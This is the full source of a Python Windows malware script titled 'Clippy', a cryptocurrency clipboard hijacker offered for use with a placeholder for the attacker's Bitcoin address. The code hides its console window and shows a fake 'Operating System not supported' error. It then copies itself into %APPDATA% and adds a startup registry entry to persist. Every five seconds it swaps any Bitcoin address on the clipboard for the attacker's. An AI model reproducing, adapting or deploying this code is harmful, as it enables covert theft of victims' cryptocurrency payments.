##############################
#           Clippy           #           
#----------------------------#
#       Simple as fuck       #
#    FUD BITCOIN CLIPPER     #
#----------------------------#
#                 ~balzabu~  #
##############################
import clipboard,coinaddr,threading,time,random,string,os,shutil,sys
import winreg as winzoz
from hashlib import sha256
import win32gui, win32con,ctypes


# HERE PUT YOUR BTC ADDRESS
btc_addr = "1337leetaddress"

#  THIS IS THE WINDOWS REGISTRY YOU'RE GOING TO WRITE TO ALLOW STARTUP 
#  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run --- CURRENT USER
#  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run --- ALL USERS
ADD_ME_SIR = r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"

#DIR PATH OF THE FOLDER YOU'RE GOING TO CREATE INSIDE %Appdata% 
dir_path = '%s\\BootCheck\\' % os.environ['APPDATA']



'''
Function that hides the Windows Console when running the script
'''
def hideScript():
	try:
		hide = win32gui.GetForegroundWindow()
		win32gui.ShowWindow(hide , win32con.SW_HIDE)
	except:
		sys.exit()

'''
Checks if the program is running first time
'''
def firstBoot(dir_path):
	checkvar = os.path.exists(dir_path)
	if(checkvar == True):
		return True
	elif(checkvar == False):
		return False


'''
Functions that check if a string is a valid BTC Address ( copy-pasted from Rosettacode )
'''
digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def decode_base58(bc, length):
    n = 0
    for char in bc:
        n = n * 58 + digits58.index(char)
    return n.to_bytes(length, 'big')
def check_bc(bc):
    try:
        bcbytes = decode_base58(bc, 25)
        return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
    except Exception:
        return False



'''
Function that creates and sets the value of a registry key for us
'''
def set_run_key(key, value):
    reg_key = winzoz.OpenKey(
        winzoz.HKEY_CURRENT_USER,
        ADD_ME_SIR,
        0, winzoz.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winzoz.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winzoz.REG_EXPAND_SZ
            else:
                var_type = winzoz.REG_SZ
            winzoz.SetValueEx(reg_key, key, 0, var_type, value)

''' 
Function that creates a directory in the supplied input
'''
def createdir(dir_path):
	if not os.path.exists(dir_path):
		os.makedirs(dir_path)


'''
Function that create a folder called BootCheck in the %appdata% user path and 
replicates the running file inside that folder to then create a startup key.
'''
def copythisshit():
	# Create a directory in %appdata% folder
	createdir(dir_path)
	# Generate a dodgy filename cause too much 1337 skills
	dodgyfilename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 12)) 
	copied_script_name = os.path.basename(__file__)
	# Let's copy the file to the %appdata% folder we just created... :-)
	shutil.copy(__file__,  dir_path + copied_script_name) 
	#I need this path in order to set the startup key
	clonepath = '"' + dir_path + copied_script_name + '"'
	return clonepath

'''
Function that checks if directory %appdata%/BootCheck exists. If so, 
the program has already been executed one time so no need to reinstall.
Also, if first run, shows an error message telling the user that his
Operating System is not supported.
'''
def setup():
	hideScript()
	firstBootCheck = firstBoot(dir_path)
	if(firstBootCheck == False):
		message = "Operating System not supported."
		ctypes.windll.user32.MessageBoxW(None, message, u"Fatal Error", 0)
		path = copythisshit()
		# Wait 4 seconds just 4 the lulz
		time.sleep(4)
		# We set the startup key, gave the name BootCheck cause who cares??
		set_run_key('BootCheck',path)
		# Wait again 4 seconds just 4 the lulz
		time.sleep(4)
	else:
		pass


'''
Function that runs recursively every 5 seconds, checks the clipboard content and
if it detects a valid BTC Address proceeds to swap it with the btc_addr specified
by the attacker.
'''
def getclipboard():
	threading.Timer(5.0, getclipboard).start()
	clippednow = clipboard.paste()
	isvalid = check_bc(clippednow)
	if( isvalid == True):
		clipboard.copy(btc_addr)



'''this is the main '''
if __name__ == "__main__":
	setup()
	getclipboard()